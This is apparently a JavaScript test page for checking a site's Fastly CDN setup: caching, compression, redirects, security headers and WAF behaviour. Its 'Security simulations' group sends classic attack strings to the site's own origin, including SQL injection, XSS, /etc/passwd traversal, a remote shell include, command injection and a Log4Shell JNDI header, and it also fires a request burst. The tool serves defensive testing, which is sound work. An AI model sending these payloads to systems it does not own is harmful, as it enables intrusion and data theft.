(() => {
  const $ = (s) => document.querySelector(s);
  const baseEl = $("#base"), dbgEl = $("#dbg");
  baseEl.value = location.origin;

  const SHOW = ["x-cache", "x-cache-hits", "age", "via", "x-served-by", "x-timer", "cache-control",
    "surrogate-control", "surrogate-key", "etag", "last-modified", "vary", "content-type", "content-length",
    "content-encoding", "accept-ranges", "content-range", "location", "retry-after", "server",
    "fastly-debug-path", "fastly-debug-ttl", "fastly-debug-digest", "x-geo-country", "x-geo-city"];

  const url = (p) => new URL(p, baseEl.value.replace(/\/?$/, "/")).toString();
  const bust = () => "bust=" + Date.now() + Math.floor(Math.random() * 1e4);

  async function req(path, opt = {}) {
    const headers = Object.assign({}, opt.headers || {});
    if (dbgEl.checked) headers["Fastly-Debug"] = "1";
    const t0 = performance.now();
    const res = await fetch(url(path), Object.assign({ cache: "no-store" }, opt, { headers }));
    return { res, ms: Math.round(performance.now() - t0) };
  }

  const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
  const pill = (txt, cls) => `<span class="pill ${cls || ""}">${esc(txt)}</span>`;
  const kv = (obj) => `<div class="kv">${Object.entries(obj).map(([k, v]) => `<span>${esc(k)}</span><span>${esc(v)}</span>`).join("")}</div>`;
  const hdrs = (res) => { const o = {}; SHOW.forEach((h) => { const v = res.headers.get(h); if (v !== null) o[h] = v; }); return o; };
  const allHdrs = (res) => `<details><summary>All response headers</summary><pre>${esc([...res.headers].map(([k, v]) => k + ": " + v).join("\n"))}</pre></details>`;
  const cls = (st) => (st >= 200 && st < 300 ? "ok" : st === 304 || st === 206 ? "ok" : st >= 400 && st < 500 ? "warn" : "bad");
  const line = (res, ms) => `${pill(res.status + " " + (res.statusText || ""), cls(res.status))} ${ms} ms`;

  // ---- test definitions ----
  const GROUPS = [
    { name: "Caching", tests: [
      { id: "hitmiss", title: "Cache HIT / MISS", desc: "Requests the same URL twice. Expect MISS then HIT with a growing Age.",
        run: async () => {
          const p = "assets/data.json?" + bust();
          const a = await req(p), b = await req(p);
          return `<b>Request 1</b> ${line(a.res, a.ms)}${kv(hdrs(a.res))}<b>Request 2</b> ${line(b.res, b.ms)}${kv(hdrs(b.res))}${allHdrs(b.res)}`;
        } },
      { id: "bypass", title: "Cache key / bypass with query string", desc: "Unique query strings should each be a fresh MISS unless your VCL strips them from the cache key.",
        run: async () => {
          const out = [];
          for (let i = 0; i < 3; i++) { const r = await req("assets/data.json?" + bust()); out.push(`#${i + 1} ${line(r.res, r.ms)} x-cache: ${r.res.headers.get("x-cache") || "n/a"}`); }
          return out.join("<br>");
        } },
      { id: "cond", title: "Conditional request (304)", desc: "Sends If-None-Match using the ETag. Expect 304 Not Modified.",
        run: async () => {
          const a = await req("assets/data.json"); const et = a.res.headers.get("etag");
          if (!et) return `${line(a.res, a.ms)} No ETag returned, so a 304 can't be tested.${allHdrs(a.res)}`;
          const b = await req("assets/data.json", { headers: { "If-None-Match": et } });
          return `ETag <code>${esc(et)}</code><br>${line(b.res, b.ms)}${kv(hdrs(b.res))}`;
        } },
      { id: "range", title: "Range request (206)", desc: "Requests the first 100 bytes of a larger file. Expect 206 Partial Content.",
        run: async () => {
          const r = await req("assets/big.txt", { headers: { Range: "bytes=0-99" } });
          const t = await r.res.text();
          return `${line(r.res, r.ms)} body length: ${t.length}${kv(hdrs(r.res))}`;
        } },
      { id: "purge", title: "Purge check", desc: "Fetch, purge from Fastly (URL or surrogate key), fetch again. Use the buttons below as a before/after view.",
        run: async () => {
          const r = await req("assets/data.json");
          return `${line(r.res, r.ms)}${kv(hdrs(r.res))}<p class="note">Purge with: <code>curl -X PURGE ${esc(url("assets/data.json"))}</code>, then run this again. Expect a MISS and Age reset.</p>`;
        } },
    ] },
    { name: "Delivery and performance", tests: [
      { id: "gzip", title: "Compression", desc: "Requests a compressible text file. Look for content-encoding gzip or br.",
        run: async () => {
          const r = await req("assets/big.txt");
          const buf = await r.res.arrayBuffer();
          return `${line(r.res, r.ms)} decoded size: ${buf.byteLength} bytes${kv(hdrs(r.res))}`;
        } },
      { id: "proto", title: "Protocol and TLS", desc: "Reports HTTP version of this page load (h2 or h3 when served by Fastly) and TLS.",
        run: async () => {
          const nav = performance.getEntriesByType("navigation")[0] || {};
          return kv({ "next hop protocol": nav.nextHopProtocol || "unavailable", "page scheme": location.protocol, "secure context": String(isSecureContext) });
        } },
      { id: "hdrs", title: "Edge headers on the home page", desc: "Shows Fastly headers (X-Served-By, X-Timer, Via, geo headers if your VCL sets them).",
        run: async () => { const r = await req("index.html"); return `${line(r.res, r.ms)}${kv(hdrs(r.res))}${allHdrs(r.res)}`; } },
      { id: "redir", title: "Redirect handling", desc: "Requests /assets without a trailing slash. Checks whether a redirect occurred and where it ended.",
        run: async () => { const r = await req("assets"); return `${line(r.res, r.ms)}${kv({ redirected: String(r.res.redirected), "final url": r.res.url })}`; } },
      { id: "err", title: "Custom error page (404)", desc: "Requests a missing path. Expect 404 with the renworx error page, or your Fastly synthetic response.",
        run: async () => {
          const r = await req("does-not-exist-" + Date.now()); const t = await r.res.text();
          return `${line(r.res, r.ms)}${kv(hdrs(r.res))}<details><summary>Body preview</summary><pre>${esc(t.slice(0, 400))}</pre></details>`;
        } },
    ] },
    { name: "Security simulations", tests: [
      { id: "secaudit", title: "Security header audit", desc: "Checks the home page response for common security headers (add them in VCL or the Fastly UI).",
        run: async () => {
          const r = await req("index.html");
          const want = ["strict-transport-security", "content-security-policy", "x-content-type-options", "x-frame-options", "referrer-policy", "permissions-policy"];
          return kv(Object.fromEntries(want.map((h) => [h, r.res.headers.get(h) || "MISSING"])));
        } },
      { id: "sqli", title: "WAF: SQL injection probes", desc: "Sends benign requests carrying classic SQLi strings. A blocking WAF returns 403 or 406; log-only mode passes them through.",
        run: () => probes(["?id=1%27%20OR%20%271%27%3D%271", "?id=1;DROP%20TABLE%20users--", "?q=%27%20UNION%20SELECT%20NULL,NULL--"]) },
      { id: "xss", title: "WAF: cross-site scripting probes", desc: "Sends script and event-handler payloads in the query string.",
        run: () => probes(["?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", "?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "?q=javascript:alert(1)"]) },
      { id: "trav", title: "WAF: path traversal and file inclusion", desc: "Requests encoded traversal paths and a remote include.",
        run: () => probes(["..%2f..%2f..%2fetc%2fpasswd", "?file=../../../../etc/passwd", "?page=http://example.invalid/shell.txt"]) },
      { id: "cmdi", title: "WAF: command injection and Log4Shell header", desc: "Sends shell metacharacters in the query string and a JNDI string in a custom header.",
        run: async () => {
          const a = await probes(["?cmd=%3Bcat%20%2Fetc%2Fpasswd", "?host=127.0.0.1%7Cwhoami"]);
          const r = await req("index.html", { headers: { "X-Api-Version": "${jndi:ldap://example.invalid/a}" } });
          return a + `<br>JNDI header: ${line(r.res, r.ms)}`;
        } },
      { id: "methods", title: "HTTP method restrictions", desc: "Tries POST, PUT, DELETE and OPTIONS. Static hosts normally reject writes; Fastly can block them earlier.",
        run: async () => {
          const out = [];
          for (const m of ["GET", "POST", "PUT", "DELETE", "OPTIONS"]) { const r = await req("index.html", { method: m }); out.push(`${m.padEnd(8)} ${line(r.res, r.ms)}`); }
          return out.join("<br>");
        } },
      { id: "biglong", title: "Oversized URL and header", desc: "Sends a very long query string and a very large header. Expect 414, 431, 400 or a block.",
        run: async () => {
          const a = await req("index.html?x=" + "A".repeat(9000));
          let b; try { b = await req("index.html", { headers: { "X-Big": "B".repeat(9000) } }); } catch (e) { b = null; }
          return `Long URL: ${line(a.res, a.ms)}<br>Large header: ${b ? line(b.res, b.ms) : "request rejected before a response"}`;
        } },
      { id: "spoof", title: "Header spoofing", desc: "Sends a forged X-Forwarded-For and Host-style headers to see whether your VCL trusts them.",
        run: async () => {
          const r = await req("index.html", { headers: { "X-Forwarded-For": "203.0.113.50", "X-Real-IP": "203.0.113.50" } });
          return `${line(r.res, r.ms)}${kv(hdrs(r.res))}`;
        } },
      { id: "rate", title: "Rate limiting burst", desc: "Fires 60 requests (10 at a time) at one URL. Look for 429 or 403 once your rate limit trips.",
        run: async (el) => {
          const N = 60, C = 10, counts = {}; let done = 0;
          const one = async () => { try { const r = await req("assets/data.json"); counts[r.res.status] = (counts[r.res.status] || 0) + 1; } catch { counts.error = (counts.error || 0) + 1; } done++; el.innerHTML = `Sent ${done}/${N}...`; };
          const t0 = performance.now();
          for (let i = 0; i < N; i += C) await Promise.all(Array.from({ length: C }, one));
          return `Finished in ${Math.round(performance.now() - t0)} ms${kv(counts)}`;
        } },
      { id: "cors", title: "CORS preflight", desc: "Sends OPTIONS with CORS request headers and shows any Access-Control-* response headers.",
        run: async () => {
          const r = await req("assets/data.json", { method: "OPTIONS", headers: { "Access-Control-Request-Method": "GET" } });
          const o = {}; [...r.res.headers].filter(([k]) => k.startsWith("access-control")).forEach(([k, v]) => (o[k] = v));
          return `${line(r.res, r.ms)}${Object.keys(o).length ? kv(o) : "<br>No Access-Control headers returned."}`;
        } },
    ] },
  ];

  async function probes(list) {
    const rows = [];
    for (const p of list) {
      const r = await req(p.startsWith("?") ? "index.html" + p : p);
      const blocked = [403, 406, 429].includes(r.res.status);
      rows.push(`${pill(blocked ? "BLOCKED" : "PASSED", blocked ? "ok" : "warn")} ${line(r.res, r.ms)} <code>${esc(p)}</code>`);
    }
    return rows.join("<br>");
  }

  // ---- render ----
  const groupsEl = $("#groups"); const runners = [];
  GROUPS.forEach((g) => {
    const sec = document.createElement("section"); sec.className = "group";
    sec.innerHTML = `<h2>${g.name}</h2>`;
    g.tests.forEach((t) => {
      const d = document.createElement("div"); d.className = "test";
      d.innerHTML = `<header><div><h3>${t.title}</h3><p>${t.desc}</p></div><button class="btn small">Run</button></header><div class="out" aria-live="polite"></div>`;
      const out = d.querySelector(".out"), btn = d.querySelector("button");
      const run = async () => {
        btn.disabled = true; out.innerHTML = "Running...";
        try { out.innerHTML = await t.run(out); } catch (e) { out.innerHTML = `${pill("ERROR", "bad")} ${esc(e.message)}`; }
        btn.disabled = false;
      };
      btn.addEventListener("click", run); runners.push(run); sec.appendChild(d);
    });
    groupsEl.appendChild(sec);
  });

  $("#runAll").addEventListener("click", async () => { for (const r of runners) await r(); });
  $("#clear").addEventListener("click", () => document.querySelectorAll(".out").forEach((o) => (o.innerHTML = "")));

  // Image Optimizer previews
  const ioList = [["Original", ""], ["width=300", "?width=300"], ["width=300 & format=webp", "?width=300&format=webp"], ["quality=20 & auto=webp", "?quality=20&auto=webp"]];
  $("#imgs").innerHTML = ioList.map(([c, q]) => `<figure><img loading="lazy" src="assets/sample.png${q}" alt="${c}"><figcaption>${c}<br><code>sample.png${q}</code></figcaption></figure>`).join("");

  $("#env").textContent = `Loaded from ${location.origin}. ` + (location.hostname.match(/localhost|127\.0\.0\.1/) ? "Local mode: no Fastly headers expected until you test through your Fastly domain." : "");
})();
